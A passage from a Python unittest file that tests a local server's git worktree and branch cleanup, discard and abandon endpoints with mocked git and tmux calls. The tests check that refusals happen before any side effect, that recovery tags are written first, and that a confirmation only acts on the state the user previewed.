            return git_proc(args, 0, "", "")

        def fake_run_backlog(args, cwd):
            raise server.BacklogError("backlog: command failed: boom")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=fake_run_backlog), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 409)
        self.assertIn("not fully merged", body["error"])

    def test_post_cleanup_branch_worktree_missing_but_branch_exists_deletes_branch_only(self):
        # Worktree already gone (removed by hand, or by whatever merged it
        # out-of-band) but the branch ref is still there -- skip removal,
        # still delete the branch.
        git_calls = []

        def fake_run_git(args, cwd=None):
            git_calls.append(tuple(args))
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["branch"]:
                return git_proc(args, 0, "", "")
            return git_proc(args, 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p == self.my_app_dir):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 200)
        self.assertFalse(body["worktreeRemoved"])
        self.assertEqual(body["discardedPaths"], [])
        self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])
        self.assertIn(("branch", "-d", "task/task-9"), git_calls)

    def test_post_cleanup_branch_neither_worktree_nor_branch_returns_404(self):
        def fake_run_git(args, cwd=None):
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 1, "", "")  # branch doesn't exist either
            return git_proc(args, 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch("os.path.isdir", side_effect=lambda p: p == self.my_app_dir):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 404)
        self.assertIn("error", body)

    def test_post_cleanup_branch_delete_failure_returns_500(self):
        # -d is safe (ancestry was just re-verified) so a failure here is
        # unexpected -- surfaced as a 500 with git's own stderr, never
        # silently forced through with -D.
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")

        def fake_run_git(args, cwd=None):
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["status"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["worktree"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["branch"]:
                return git_proc(args, 1, "", "error: branch not fully merged")
            return git_proc(args, 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 500)
        self.assertIn("error", body)

    # -- task-80: external checkout -> honest 409, never a raw git error --

    def _worktree_porcelain(self, task_branch_path=None, branch="task/task-9"):
        """`git worktree list --porcelain` for my-app: the main checkout,
        plus (optionally) the task branch checked out at task_branch_path."""
        out = f"worktree {self.my_app_dir}\nHEAD aaa\nbranch refs/heads/main\n\n"
        if task_branch_path is not None:
            out += f"worktree {task_branch_path}\nHEAD bbb\nbranch refs/heads/{branch}\n\n"
        return out

    def _cleanup_run_git(self, git_calls, porcelain, branch_d_rc=0):
        """A fake run_git for a Done, fully-merged task/task-9 (rev-parse
        finds the branch, merge-base says ancestor) whose checkout is
        wherever `porcelain` says. Records every call in git_calls."""
        def fake_run_git(args, cwd=None):
            git_calls.append(tuple(args))
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:1] == ["merge-base"]:
                return git_proc(args, 0, "", "")
            if args[:2] == ["worktree", "list"]:
                return git_proc(args, 0, porcelain, "")
            if args[:1] == ["log"]:
                return git_proc(args, 0, "1700000000\n", "")
            if args[:1] == ["status"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["worktree"]:
                return git_proc(args, 0, "", "")
            if args[:1] == ["branch"]:
                return git_proc(args, branch_d_rc, "", "error: cannot delete branch 'task/task-9' used by worktree at '/elsewhere'")
            return git_proc(args, 0, "", "")
        return fake_run_git

    def test_post_cleanup_branch_external_checkout_returns_409_with_the_spawn_reason_before_any_side_effect(self):
        # The TASK-74 reproduction, hermetically: task/task-9 was merged
        # out-of-band (ancestor + Done on main, so alreadyMerged is true
        # and the board offers cleanup) but is still checked out in a
        # worktree Centrale does not manage. `git branch -d` would refuse;
        # the handler must classify via `git worktree list --porcelain`
        # first and answer with spawn's exact external-checkout sentence.
        import spawn

        foreign = os.path.join(self.my_app_dir, ".worktrees", "someone-elses-checkout")
        git_calls = []
        # Even a (wrongly) attempted `branch -d` would fail here, so a
        # 409 can only come from the up-front classification.
        fake_run_git = self._cleanup_run_git(git_calls, self._worktree_porcelain(foreign), branch_d_rc=1)

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p == self.my_app_dir):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 409)
        self.assertEqual(body["error"], spawn.external_checkout_reason("task/task-9", foreign))
        self.assertIn(foreign, body["error"])
        self.assertNotIn("used by worktree at", body["error"])  # never git's own text
        # No destructive git call of any kind was made.
        self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])
        self.assertNotIn(("branch",), [c[:1] for c in git_calls])
        self.assertIn(("worktree", "list", "--porcelain"), git_calls)

    def test_post_cleanup_branch_external_checkout_409_wins_even_when_not_fully_merged(self):
        # Ordering is the implementer's call (task-80) but must be
        # deterministic: the foreign checkout is the root cause either
        # way, so it is reported ahead of "not fully merged" -- and the
        # backlog CLI is never consulted for it.
        import spawn

        foreign = os.path.join(self.my_app_dir, ".worktrees", "someone-elses-checkout")
        git_calls = []
        base_fake = self._cleanup_run_git(git_calls, self._worktree_porcelain(foreign))

        def fake_run_git(args, cwd=None):
            if args[:1] == ["merge-base"]:
                git_calls.append(tuple(args))
                return git_proc(args, 1, "", "")  # NOT an ancestor
            return base_fake(args, cwd)

        def no_backlog(args, cwd):
            raise AssertionError(f"backlog must not be consulted before the external refusal: {args}")

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=no_backlog), \
             mock.patch("os.path.isdir", side_effect=lambda p: p == self.my_app_dir):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 409)
        self.assertEqual(body["error"], spawn.external_checkout_reason("task/task-9", foreign))
        self.assertNotIn(("merge-base",), [c[:1] for c in git_calls])
        self.assertNotIn(("branch",), [c[:1] for c in git_calls])

    def test_post_cleanup_branch_live_session_still_wins_over_external_checkout(self):
        # The live-session refusal stays first: nothing about the branch
        # is even classified while an agent may still be working on it.
        foreign = os.path.join(self.my_app_dir, ".worktrees", "someone-elses-checkout")
        git_calls = []
        fake_run_git = self._cleanup_run_git(git_calls, self._worktree_porcelain(foreign))

        def live_run_tmux(args):
            if args[0] == "list-sessions":
                return subprocess.CompletedProcess(["tmux", *args], 0, "centrale-my-app-task-9\t1\t0\n", "")
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

        with mock.patch.object(server, "run_tmux", side_effect=live_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch("os.path.isdir", side_effect=lambda p: p == self.my_app_dir):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 409)
        self.assertIn("live tmux session", body["error"])
        self.assertEqual(git_calls, [])

    def test_post_cleanup_branch_centrale_checkout_still_removes_worktree_and_deletes_branch(self):
        # kind == "centrale": the branch is checked out at Centrale's own
        # worktree path -> today's behavior exactly (remove, then -d).
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")
        git_calls = []
        fake_run_git = self._cleanup_run_git(git_calls, self._worktree_porcelain(wt_dir))

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 200)
        self.assertTrue(body["ok"])
        self.assertTrue(body["worktreeRemoved"])
        self.assertEqual(body["discardedPaths"], [])
        self.assertIn(("worktree", "remove", "--force", wt_dir), git_calls)
        self.assertIn(("branch", "-d", "task/task-9"), git_calls)
        self.assertLess(git_calls.index(("worktree", "remove", "--force", wt_dir)),
                        git_calls.index(("branch", "-d", "task/task-9")))

    def test_post_cleanup_branch_parked_branch_still_deletes_branch(self):
        # kind == "none": the branch exists but is checked out nowhere (its
        # worktree already removed) -> branch delete only, 200.
        git_calls = []
        fake_run_git = self._cleanup_run_git(git_calls, self._worktree_porcelain(None))

        with mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux), \
             mock.patch.object(server, "run_git", side_effect=fake_run_git), \
             mock.patch.object(server, "run_backlog", side_effect=self._run_backlog_task_status("TASK-9", "Done")), \
             mock.patch("os.path.isdir", side_effect=lambda p: p == self.my_app_dir):
            status, body = self._post_json("/api/cleanup-branch", {"project": "my-app", "taskId": "TASK-9"})

        self.assertEqual(status, 200)
        self.assertTrue(body["ok"])
        self.assertFalse(body["worktreeRemoved"])
        self.assertEqual(body["discardedPaths"], [])
        self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])
        self.assertIn(("branch", "-d", "task/task-9"), git_calls)

    # -- throwing an attempt away (task-119) -------------------------------
    #
    # /api/discard-preview, /api/discard-attempt and /api/abandon-worktree.
    # The three share their identity validation and their refusals, so the
    # refusal tests below are written against both destructive routes
    # rather than once against whichever came first.

    TIP_SHA = "1fb0261627d96454a5d478560631e4bbdc9bd015"

    # Realistic spaced Backlog.md filenames, per the same reasoning as the
    # cleanup fixture above: git quotes these, and a dequoting mismatch
    # hides in exactly this kind of name.
    DISCARD_STATUS_OUTPUT = (
        ' M "backlog/tasks/task-9 - Detect externally merged branches, replace Merge with informed cleanup.md"\n'
        '?? "backlog/drafts/task-9.1 - Follow-up notes for cleanup edge cases.md"\n'
        '?? scratch.txt\n'
    )
    DISCARD_DIRTY_PATHS = [
        "backlog/tasks/task-9 - Detect externally merged branches, replace Merge with informed cleanup.md",
        "backlog/drafts/task-9.1 - Follow-up notes for cleanup edge cases.md",
        "scratch.txt",
    ]

    def _discard_run_git(self, git_calls, porcelain, *, branch_exists=True,
                         commit_count="3", status_output=None, tag_rc=0,
                         remove_rc=0, delete_rc=0, status_rc=0):
        """A fake run_git for task/task-9 as a still-unmerged attempt:
        3 commits over main and a dirty worktree, checked out wherever
        `porcelain` says. Records every call in git_calls."""
        if status_output is None:
            status_output = self.DISCARD_STATUS_OUTPUT

        def fake_run_git(args, cwd=None):
            git_calls.append(tuple(args))
            if args[:1] == ["rev-parse"]:
                return git_proc(args, 0, self.TIP_SHA + "\n", "") if branch_exists \
                    else git_proc(args, 1, "", "")
            if args[:1] == ["symbolic-ref"]:
                return git_proc(args, 0, "main\n", "")
            if args[:3] == ["worktree", "list", "--porcelain"]:
                return git_proc(args, 0, porcelain, "")
            if args[:2] == ["rev-list", "--count"]:
                return git_proc(args, 0, "", "") if commit_count is None \
                    else git_proc(args, 0, commit_count + "\n", "")
            if args[:1] == ["status"]:
                return git_proc(args, status_rc, status_output, "porcelain failed")
            if args[:1] == ["tag"]:
                return git_proc(args, tag_rc, "", "fatal: tag already exists")
            if args[:2] == ["worktree", "remove"]:
                return git_proc(args, remove_rc, "", "worktree remove failed")
            # task-121: the branch delete is a compare-and-delete against
            # the tip that was just tagged, not `git branch -D`.
            if args[:2] == ["update-ref", "-d"]:
                return git_proc(args, delete_rc, "", "branch delete failed")
            if args[:1] == ["branch"]:
                return git_proc(args, delete_rc, "", "branch delete failed")
            return git_proc(args, 0, "", "")

        return fake_run_git

    def _live_session_run_tmux(self, name):
        def fake_run_tmux(args):
            if args[0] == "list-sessions":
                return subprocess.CompletedProcess(
                    ["tmux", *args], 0, f"{name}\t1690000000\t1\n", "")
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")
        return fake_run_tmux

    def _throwaway_env(self, git_calls, *, wt_exists=True, porcelain=None, **kw):
        """The common patch set: no live session, the fake git above, an
        exploding run_backlog (neither route may read or write the
        backlog task at all), and a worktree that exists or does not."""
        wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")
        if porcelain is None:
            porcelain = self._worktree_porcelain(wt_dir)
        dirs = (self.my_app_dir, wt_dir) if wt_exists else (self.my_app_dir,)

        def no_backlog(args, cwd):
            raise AssertionError(f"the backlog CLI must not be consulted: {args}")

        return wt_dir, (
            mock.patch.object(server, "run_tmux", side_effect=self._no_live_sessions_run_tmux),
            mock.patch.object(server, "run_git",
                              side_effect=self._discard_run_git(git_calls, porcelain, **kw)),
            mock.patch.object(server, "run_backlog", side_effect=no_backlog),
            mock.patch("os.path.isdir", side_effect=lambda p: p in dirs),
        )

    def _reviewed_state(self, *, branch_exists=True, wt_exists=True, status_output=None, **_):
        """The expectation a confirm armed off GET /api/discard-preview
        would carry into the destructive POST (task-121): the tip the
        preview reported and the exact uncommitted paths it listed."""
        if not wt_exists:
            paths = []
        elif status_output is None:
            paths = list(self.DISCARD_DIRTY_PATHS)
        else:
            paths = server._dirty_paths_from_status(status_output)
        return {
            "expectedBranchTip": self.TIP_SHA if branch_exists else None,
            "expectedDirtyPaths": paths,
        }

    def _run_throwaway(self, path, git_calls, expected=None, **kw):
        wt_dir, patches = self._throwaway_env(git_calls, **kw)
        payload = {"project": "my-app", "taskId": "TASK-9"}
        payload.update(self._reviewed_state(**kw) if expected is None else expected)
        with patches[0], patches[1], patches[2], patches[3]:
            status, body = self._post_json(path, payload)
        return wt_dir, status, body

    def test_post_discard_attempt_tags_the_tip_then_removes_the_worktree_and_force_deletes_the_branch(self):
        git_calls = []
        wt_dir, status, body = self._run_throwaway("/api/discard-attempt", git_calls)

        self.assertEqual(status, 200, body)
        self.assertTrue(body["ok"])
        self.assertEqual(body["branch"], "task/task-9")
        self.assertTrue(body["branchDeleted"])
        self.assertTrue(body["worktreeRemoved"])
        self.assertEqual(body["branchTip"], self.TIP_SHA)
        self.assertEqual(body["commitCount"], 3)
        self.assertEqual(body["baseBranch"], "main")
        self.assertEqual(body["discardedPaths"], self.DISCARD_DIRTY_PATHS)

        # AC #5: the SHA and a copy-pasteable command come back in the
        # response, not only in a log line.
        self.assertEqual(body["recoveryCommand"], f"git branch task/task-9 {self.TIP_SHA}")
        self.assertRegex(body["recoveryTag"], r"^abandoned/task-9-\d{8}-\d{6}$")

        # Never the safe delete: the whole point is that the commits are
        # unmerged, which is exactly what `git branch -d` refuses. It is
        # a compare-and-delete against the tip that was just tagged
        # (task-121), so the anchor and the deleted commit cannot differ.
        delete_call = ("update-ref", "-d", "refs/heads/task/task-9", self.TIP_SHA)
        self.assertIn(delete_call, git_calls)
        self.assertNotIn("branch", [c[0] for c in git_calls])

        # And the ordering that makes the irreversible act recoverable:
        # the tag is written while the branch still exists, before either
        # removal, because nothing else in the repository references
        # those commits once the worktree and the branch are both gone.
        tag_call = next(c for c in git_calls if c[0] == "tag")
        self.assertEqual(tag_call, ("tag", body["recoveryTag"], self.TIP_SHA))
        self.assertEqual(tag_call[2], delete_call[3])
        remove_call = ("worktree", "remove", "--force", wt_dir)
        self.assertLess(git_calls.index(tag_call), git_calls.index(remove_call))
        self.assertLess(git_calls.index(remove_call), git_calls.index(delete_call))

    def test_post_discard_attempt_never_reads_or_writes_the_backlog_task(self):
        # AC #2, made structural rather than asserted after the fact: the
        # patched run_backlog in _throwaway_env raises on any call, so a
        # 200 here is proof that the board was never consulted -- not a
        # status read, and certainly not a status write. Where the task
        # stands is the user's call on the board.
        git_calls = []
        _, status, body = self._run_throwaway("/api/discard-attempt", git_calls)
        self.assertEqual(status, 200, body)

    def test_post_abandon_worktree_removes_the_worktree_and_leaves_the_branch_alone(self):
        git_calls = []
        wt_dir, status, body = self._run_throwaway("/api/abandon-worktree", git_calls)

        self.assertEqual(status, 200, body)
        self.assertTrue(body["worktreeRemoved"])
        self.assertTrue(body["branchKept"])
        self.assertEqual(body["commitCount"], 3)
        self.assertEqual(body["discardedPaths"], self.DISCARD_DIRTY_PATHS)
        self.assertIn(("worktree", "remove", "--force", wt_dir), git_calls)
        # Nothing touched the branch: no delete, and no recovery tag
        # either -- there is nothing to recover from, the commits stay.
        self.assertNotIn("branch", [c[0] for c in git_calls])
        self.assertNotIn("update-ref", [c[0] for c in git_calls])
        self.assertNotIn("tag", [c[0] for c in git_calls])
        self.assertNotIn("recoveryTag", body)

    def test_post_abandon_worktree_without_a_worktree_returns_404(self):
        # A parked branch has no worktree to abandon. A silent 200 would
        # read as "abandoned" for a task someone else had already
        # cleaned up.
        git_calls = []
        _, status, body = self._run_throwaway(
            "/api/abandon-worktree", git_calls, wt_exists=False,
            porcelain=self._worktree_porcelain(None))
        self.assertEqual(status, 404)
        self.assertIn("no worktree found", body["error"])
        self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])

    def test_post_discard_attempt_on_a_parked_branch_deletes_it_with_no_worktree_removal(self):
        # The other half of the same state: the worktree is already gone
        # but the bad branch is still there, and the next spawn would
        # reuse it -- so the discard still has work to do.
        git_calls = []
        _, status, body = self._run_throwaway(
            "/api/discard-attempt", git_calls, wt_exists=False,
            porcelain=self._worktree_porcelain(None))
        self.assertEqual(status, 200, body)
        self.assertFalse(body["worktreeRemoved"])
        self.assertTrue(body["branchDeleted"])
        self.assertEqual(body["discardedPaths"], [])
        self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])
        self.assertIn(("update-ref", "-d", "refs/heads/task/task-9", self.TIP_SHA), git_calls)

    def test_post_discard_attempt_neither_worktree_nor_branch_returns_404(self):
        git_calls = []
        _, status, body = self._run_throwaway(
            "/api/discard-attempt", git_calls, wt_exists=False, branch_exists=False,
            porcelain=self._worktree_porcelain(None))
        self.assertEqual(status, 404)
        self.assertIn("no worktree or branch found", body["error"])

    def test_post_discard_attempt_aborts_with_nothing_removed_when_the_tag_fails(self):
        # The tag IS the recovery guarantee (see server.recovery_tag_name:
        # after the worktree and branch are both gone, no reflog anywhere
        # still references the tip, and a single `git gc --prune=now`
        # destroys the commits). No anchor, no delete.
        git_calls = []
        _, status, body = self._run_throwaway("/api/discard-attempt", git_calls, tag_rc=1)
        self.assertEqual(status, 500)
        self.assertIn("failed to tag", body["error"])
        self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])
        self.assertNotIn("branch", [c[0] for c in git_calls])
        self.assertNotIn("update-ref", [c[0] for c in git_calls])

    def test_post_discard_attempt_still_discards_when_the_commit_count_cannot_be_measured(self):
        # A count Centrale could not take is reported as null rather than
        # as a comfortable-looking zero. It does not block the way out --
        # the user has already confirmed -- but the response never claims
        # a number it does not have.
        git_calls = []
        _, status, body = self._run_throwaway("/api/discard-attempt", git_calls, commit_count=None)
        self.assertEqual(status, 200, body)
        self.assertIsNone(body["commitCount"])
        self.assertEqual(body["branchTip"], self.TIP_SHA)
        self.assertIn(("update-ref", "-d", "refs/heads/task/task-9", self.TIP_SHA), git_calls)

    def test_both_throwaway_routes_refuse_a_live_session_with_409_and_touch_nothing(self):
        for path in ("/api/discard-attempt", "/api/abandon-worktree"):
            for name in ("centrale-my-app-task-9",):
                with self.subTest(path=path, session=name):
                    git_calls = []
                    with mock.patch.object(server, "run_tmux",
                                           side_effect=self._live_session_run_tmux(name)), \
                         mock.patch.object(server, "run_git",
                                           side_effect=self._discard_run_git(
                                               git_calls, self._worktree_porcelain(
                                                   os.path.join(self.config["worktreeRoot"],
                                                                "my-app-task-9")))), \
                         mock.patch("os.path.isdir", return_value=True):
                        status, body = self._post_json(path, dict(
                            {"project": "my-app", "taskId": "TASK-9"},
                            **self._reviewed_state()))
                    self.assertEqual(status, 409)
                    self.assertIn("live tmux session", body["error"])
                    self.assertIn(name, body["error"])
                    self.assertEqual(git_calls, [])

    def test_both_throwaway_routes_refuse_an_external_checkout_before_any_side_effect(self):
        # task-70/80's sentence, reused verbatim: git refuses to delete a
        # checked-out branch and this is not Centrale's worktree to
        # remove, so both routes say so up front rather than surfacing
        # git's own version-dependent wording after the fact.
        import spawn

        foreign = os.path.join(self.my_app_dir, ".worktrees", "someone-elses-checkout")
        for path in ("/api/discard-attempt", "/api/abandon-worktree"):
            with self.subTest(path=path):
                git_calls = []
                _, status, body = self._run_throwaway(
                    path, git_calls, porcelain=self._worktree_porcelain(foreign))
                self.assertEqual(status, 409)
                self.assertEqual(body["error"],
                                 spawn.external_checkout_reason("task/task-9", foreign))
                self.assertNotIn("used by worktree at", body["error"])  # never git's own text
                self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])
                self.assertNotIn("tag", [c[0] for c in git_calls])
                self.assertNotIn("branch", [c[0] for c in git_calls])
                self.assertNotIn("update-ref", [c[0] for c in git_calls])

    # -- task-121: the confirm is bound to the state it described --------
    #
    # Preview and POST are two requests, and the repository can move
    # between them. Every test below is the same claim from a different
    # side: a destructive click acts on exactly the state the user
    # reviewed, or on nothing at all.

    def _late_live_session_run_tmux(self, name):
        """No session on the first `tmux list-sessions`, a live one on
        every call after it -- an agent (or a person) starting a session
        between the discard's first refusal check and its last."""
        seen = []

        def fake_run_tmux(args):
            if args[0] == "list-sessions":
                seen.append(1)
                out = f"{name}\t1690000000\t1\n" if len(seen) > 1 else ""
                return subprocess.CompletedProcess(["tmux", *args], 0, out, "")
            return subprocess.CompletedProcess(["tmux", *args], 0, "", "")

        return fake_run_tmux

    def test_both_throwaway_routes_refuse_a_branch_that_moved_since_the_preview(self):
        # The reproduction task-121 was filed on: the preview reported a
        # tip, another commit landed, and the already-armed confirm went
        # ahead and destroyed a commit it had never named.
        stale_tip = "0" * 40
        for path in ("/api/discard-attempt", "/api/abandon-worktree"):
            with self.subTest(path=path):
                git_calls = []
                _, status, body = self._run_throwaway(
                    path, git_calls,
                    expected={"expectedBranchTip": stale_tip,
                              "expectedDirtyPaths": list(self.DISCARD_DIRTY_PATHS)})
                self.assertEqual(status, 409, body)
                self.assertIn("task/task-9 has moved", body["error"])
                self.assertIn(self.TIP_SHA[:10], body["error"])
                self.assertIn(stale_tip[:10], body["error"])
                self.assertIn("Nothing was discarded", body["error"])
                # Refused before every side effect, in both routes.
                self.assertNotIn("tag", [c[0] for c in git_calls])
                self.assertNotIn("update-ref", [c[0] for c in git_calls])
                self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])

    def test_both_throwaway_routes_refuse_a_worktree_whose_files_changed_since_the_preview(self):
        # The other half of what the confirm names: "and 3 uncommitted
        # files". A file written after the preview is one the user never
        # agreed to lose.
        for path in ("/api/discard-attempt", "/api/abandon-worktree"):
            with self.subTest(path=path):
                git_calls = []
                _, status, body = self._run_throwaway(
                    path, git_calls,
                    expected={"expectedBranchTip": self.TIP_SHA,
                              "expectedDirtyPaths": self.DISCARD_DIRTY_PATHS[:2]})
                self.assertEqual(status, 409, body)
                self.assertIn("3 uncommitted files now, not the 2", body["error"])
                self.assertIn("Nothing was discarded", body["error"])
                self.assertNotIn("tag", [c[0] for c in git_calls])
                self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])

    def test_a_reordered_status_listing_is_the_same_state_and_still_discards(self):
        # Order is not part of what the user reviewed ("3 uncommitted
        # files" is), and `git status --porcelain` order is not a
        # promise. A reordering destroys nothing new, so it must not
        # cost a second confirm.
        git_calls = []
        _, status, body = self._run_throwaway(
            "/api/discard-attempt", git_calls,
            expected={"expectedBranchTip": self.TIP_SHA,
                      "expectedDirtyPaths": list(reversed(self.DISCARD_DIRTY_PATHS))})
        self.assertEqual(status, 200, body)
        self.assertEqual(body["discardedPaths"], self.DISCARD_DIRTY_PATHS)

    def test_both_throwaway_routes_refuse_a_confirm_that_names_no_state_at_all(self):
        # A POST that states no expectation has reviewed no state, which
        # is exactly the gap this closes -- so it is a 400, not a silent
        # re-survey. Refused before any subprocess: the error names
        # where the two values come from.
        bodies = [
            ({"project": "my-app", "taskId": "TASK-9"}, "expectedBranchTip"),
            ({"project": "my-app", "taskId": "TASK-9",
              "expectedBranchTip": self.TIP_SHA}, "expectedDirtyPaths"),
            ({"project": "my-app", "taskId": "TASK-9", "expectedBranchTip": "1fb0261",
              "expectedDirtyPaths": []}, "40-character commit sha"),
            ({"project": "my-app", "taskId": "TASK-9", "expectedBranchTip": self.TIP_SHA,
              "expectedDirtyPaths": "scratch.txt"}, "expectedDirtyPaths must be the list"),
            ({"project": "my-app", "taskId": "TASK-9", "expectedBranchTip": self.TIP_SHA,
              "expectedDirtyPaths": [{"path": "scratch.txt"}]}, "expectedDirtyPaths must be the list"),
        ]
        for path in ("/api/discard-attempt", "/api/abandon-worktree"):
            for payload, expected_text in bodies:
                with self.subTest(path=path, missing=expected_text):
                    git_calls = []
                    wt_dir, patches = self._throwaway_env(git_calls)
                    with patches[0], patches[1], patches[2], patches[3]:
                        status, body = self._post_json(path, payload)
                    self.assertEqual(status, 400, body)
                    self.assertIn(expected_text, body["error"])
                    self.assertEqual(git_calls, [])

    def test_a_null_expected_tip_is_a_reviewed_state_not_a_missing_one(self):
        # "I reviewed a task whose branch is already gone" is a real,
        # previewable state (a worktree someone else's delete left
        # behind), and it is not the same statement as omitting the
        # field. It binds like any other: the branch really must be gone.
        git_calls = []
        _, status, body = self._run_throwaway(
            "/api/abandon-worktree", git_calls, branch_exists=False,
            porcelain=self._worktree_porcelain(None))
        self.assertEqual(status, 200, body)
        self.assertFalse(body["branchKept"])

        git_calls = []
        _, status, body = self._run_throwaway(
            "/api/discard-attempt", git_calls,
            expected={"expectedBranchTip": None,
                      "expectedDirtyPaths": list(self.DISCARD_DIRTY_PATHS)})
        self.assertEqual(status, 409, body)
        self.assertIn("exists now and did not", body["error"])
        self.assertNotIn("tag", [c[0] for c in git_calls])

    def test_a_worktree_too_dirty_to_fit_the_ordinary_body_cap_is_still_discardable(self):
        # The expectation is as long as the preview's own path list, so
        # these two routes take a bigger body than the rest of the API
        # (see DISCARD_BODY_MAX_BYTES): a worktree with thousands of
        # untracked files must not become the one thing Centrale cannot
        # throw away.
        paths = [f"build/generated/module-{n:04d}/output artifact.bin" for n in range(2000)]
        status_output = "".join(f'?? "{path}"\n' for path in paths)
        self.assertGreater(len(json.dumps(paths)), 64 * 1024)

        git_calls = []
        _, status, body = self._run_throwaway(
            "/api/discard-attempt", git_calls, status_output=status_output)
        self.assertEqual(status, 200, body)
        self.assertEqual(body["discardedPaths"], paths)

    def test_a_live_session_appearing_after_the_survey_refuses_before_the_tag(self):
        # The lifecycle lock rules out Centrale's own spawn/resume, but a
        # session started outside it can still appear -- so the refusal
        # is checked again immediately before the first destructive call,
        # and killing an agent's worktree out from under it is still the
        # thing that must not happen.
        for path in ("/api/discard-attempt", "/api/abandon-worktree"):
            with self.subTest(path=path):
                git_calls = []
                wt_dir = os.path.join(self.config["worktreeRoot"], "my-app-task-9")
                with mock.patch.object(
                        server, "run_tmux",
                        side_effect=self._late_live_session_run_tmux("centrale-my-app-task-9")), \
                     mock.patch.object(server, "run_git",
                                       side_effect=self._discard_run_git(
                                           git_calls, self._worktree_porcelain(wt_dir))), \
                     mock.patch("os.path.isdir",
                                side_effect=lambda p: p in (self.my_app_dir, wt_dir)):
                    status, body = self._post_json(path, dict(
                        {"project": "my-app", "taskId": "TASK-9"}, **self._reviewed_state()))

                self.assertEqual(status, 409, body)
                self.assertIn("centrale-my-app-task-9", body["error"])
                # The survey ran (it is read-only); nothing after it did.
                self.assertNotIn("tag", [c[0] for c in git_calls])
                self.assertNotIn("update-ref", [c[0] for c in git_calls])
                self.assertNotIn(("worktree", "remove"), [c[:2] for c in git_calls])

    def test_lifecycle_requests_for_one_task_serialize_while_another_task_runs_free(self):
        # Centrale is a ThreadingHTTPServer: without the per-task
        # lifecycle lock a second discard's git calls interleave with the
        # first's -- tagging and force-deleting a branch the first is
        # halfway through removing. With it they queue, and a discard of
        # an UNRELATED task still runs straight through, because the lock
        # is per task and not one global one.
        import threading

        wt9 = os.path.join(self.config["worktreeRoot"], "my-app-task-9")
        wt10 = os.path.join(self.config["worktreeRoot"], "my-app-task-10")
        porcelain = (self._worktree_porcelain(wt9) +
